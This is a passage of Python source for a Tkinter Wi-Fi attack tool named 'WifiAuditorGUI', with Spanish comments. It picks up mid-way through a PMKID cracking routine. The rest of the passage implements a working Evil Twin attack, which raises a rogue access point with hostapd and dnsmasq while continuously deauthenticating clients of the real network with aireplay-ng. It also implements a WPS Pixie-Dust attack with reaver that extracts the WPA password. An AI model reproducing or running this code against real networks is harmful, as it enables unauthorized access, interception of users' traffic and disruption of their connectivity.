                        self.log_queue.put("[!] Contraseña no encontrada en el diccionario.")
                        self.update_attack_status("Contraseña no encontrada")
                else:
                    self.log_queue.put("[!] No se pudo extraer un hash válido del PMKID.")
                    self.update_attack_status("Fallo al extraer hash")
            elif not self.stop_event.is_set():
                self.log_queue.put("[!] No se pudo capturar PMKID en el tiempo establecido.")
                self.update_attack_status("Fallo al capturar PMKID")

        finally:
            stop_monitor_mode(self.monitor_interface, self.log_queue)
            self.attack_finished()
            self.monitor_interface = None

    # <--- NUEVO: Secuencia de ataque Evil Twin
    def run_evil_twin_sequence(self):
        essid = self.et_essid.get()
        bssid = self.et_bssid.get()
        channel = self.et_channel.get()
        
        self.update_attack_status("Configurando Evil Twin...")
        self.monitor_interface = set_monitor_mode(self.base_interface, self.log_queue)
        if not self.monitor_interface or self.stop_event.is_set():
            self.attack_finished()
            return
            
        hostapd_conf = create_hostapd_conf(self.monitor_interface, essid, channel)
        dnsmasq_conf = create_dnsmasq_conf(self.monitor_interface)

        try:
            self.log_queue.put("\n--- Iniciando Ataque Evil Twin ---")
            
            # 1. Configurar IP de la interfaz
            self.log_queue.put(f"[*] Configurando IP 10.0.0.1 para {self.monitor_interface}")
            subprocess.run(['ifconfig', self.monitor_interface, '10.0.0.1', 'netmask', '255.255.255.0'], check=True)
            
            # 2. Iniciar dnsmasq
            self.log_queue.put("[*] Iniciando servidor DHCP/DNS (dnsmasq)...")
            dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', dnsmasq_conf, '-d'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.active_processes.append(dnsmasq_proc)
            
            # 3. Iniciar hostapd
            self.log_queue.put("[*] Iniciando punto de acceso falso (hostapd)...")
            hostapd_proc = subprocess.Popen(['hostapd', hostapd_conf], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.active_processes.append(hostapd_proc)
            time.sleep(5) # Dar tiempo a que los servicios inicien

            # 4. Iniciar desautenticación en el AP original
            self.log_queue.put(f"[*] Desautenticando clientes del AP original ({bssid})...")
            deauth_proc = subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, self.monitor_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.active_processes.append(deauth_proc)

            self.update_attack_status("Evil Twin Activo. Escuchando...")
            self.log_queue.put("[+] ¡Evil Twin está operativo! Monitorea la salida de dnsmasq para ver conexiones.")
            
            # Monitorear la salida de dnsmasq para ver actividad
            while not self.stop_event.is_set():
                line = dnsmasq_proc.stdout.readline()
                if not line: break
                self.log_queue.put(f"[DNSMASQ] {line.strip()}")
            
        except Exception as e:
            self.log_queue.put(f"[!!!] Error crítico durante el Evil Twin: {e}")
            self.update_attack_status("Error en Evil Twin")
        finally:
            self.log_queue.put("[*] Limpiando procesos de Evil Twin...")
            for proc in self.active_processes:
                proc.terminate()
            self.active_processes.clear()
            
            # Limpiar reglas de IP y restaurar interfaz
            subprocess.run(['ip', 'addr', 'flush', 'dev', self.monitor_interface], capture_output=True)
            stop_monitor_mode(self.monitor_interface, self.log_queue)
            self.attack_finished()
            self.monitor_interface = None

    # <--- NUEVO: Secuencia de ataque WPS Pixie-Dust
    def run_wps_attack_sequence(self):
        bssid = self.wps_bssid.get()
        item = self.tree.item(self.tree.focus())
        channel = item['values'][1]

        self.update_attack_status("Activando modo monitor (WPS)...")
        self.monitor_interface = set_monitor_mode(self.base_interface, self.log_queue)
        if not self.monitor_interface or self.stop_event.is_set():
            self.attack_finished()
            return
        
        try:
            self.log_queue.put("\n--- Iniciando Ataque WPS Pixie-Dust ---")
            self.update_attack_status("Atacando WPS con Reaver...")
            
            # Comando de Reaver para Pixie-Dust (-K 1)
            reaver_cmd = ['reaver', '-i', self.monitor_interface, '-b', bssid, '-c', channel, '-vvv', '-K', '1', '-N']
            reaver_proc = subprocess.Popen(reaver_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.active_processes.append(reaver_proc)
            
            found_key = None
            while not self.stop_event.is_set():
                line = reaver_proc.stdout.readline()
                if not line: break
                self.log_queue.put(line.strip())
                
                # Buscar el PIN y la clave
                if "WPS PIN:" in line:
                    pin = line.split(':')[-1].strip()
                    self.log_queue.put(f"\n[+] PIN WPS encontrado: {pin}\n")
                if "WPA PSK:" in line:
                    found_key = line.split(':')[-1].strip().strip("'")
                    self.log_queue.put(f"\n[*****] ¡ÉXITO! Contraseña WPA: {found_key} [*****]\n")
                    self.update_attack_status(f"ÉXITO: {found_key}")
                    break
            
            reaver_proc.terminate()
            self.active_processes.clear()
            
            if not found_key and not self.stop_event.is_set():
                self.log_queue.put("[!] El ataque WPS no tuvo éxito. La red puede no ser vulnerable a Pixie-Dust.")
                self.update_attack_status("Ataque WPS fallido")
                
        finally:
            stop_monitor_mode(self.monitor_interface, self.log_queue)
            self.attack_finished()
            self.monitor_interface = None


if __name__ == "__main__":
    root = tk.Tk()
    app = WifiAuditorGUI(root)
    root.mainloop()
